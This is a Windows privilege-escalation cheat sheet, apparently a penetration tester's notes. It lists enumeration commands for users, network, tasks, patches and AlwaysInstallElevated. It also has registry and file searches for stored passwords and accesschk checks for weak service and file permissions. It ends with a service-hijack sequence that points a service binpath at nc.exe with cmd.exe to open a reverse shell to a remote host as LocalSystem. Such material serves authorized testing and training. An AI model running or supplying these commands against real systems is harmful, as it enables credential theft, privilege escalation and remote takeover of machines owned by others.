**system info**
 
`systeminfo`

**Get the hostname and username (if available)**
```
hostname
echo %username%
Get users
net users
net user [username]
```

### Networking 
```
ipconfig /all

 Printer?
route print
```


**Active network connections**
`netstat -ano`

**Firewall(Win XP SP2+ only)**
```
netsh firewall show state
netsh firewall show config
```

**Scheduled tasks**

` schtasks /query /fo LIST /v `

**Running processes to started services**
```
tasklist /SVC
net start
```

**Driver**
`DRIVERQUERY`

*WMIC (Win 7/8 and XP requires admin)*

`wmic /?`


**WMIC: check patch level**
`wmic qfe get Caption,Description,HotFixID,InstalledOn`


**AlwaysInstallElevated msi package**
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```


**some more**

```
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

```

**Service permissions**
```
sc query
sc qc [service_name]
```


**Accesschk**
```
accesschk.exe /accepteula (to escape the prompt)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * 
accesschk.exe -ucqv [service_name]
```

**Find all weak folder permissions per drive.**
```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```


**Find all weak file permissions per drive.**
```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

**Service exploitation**

```
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]
```
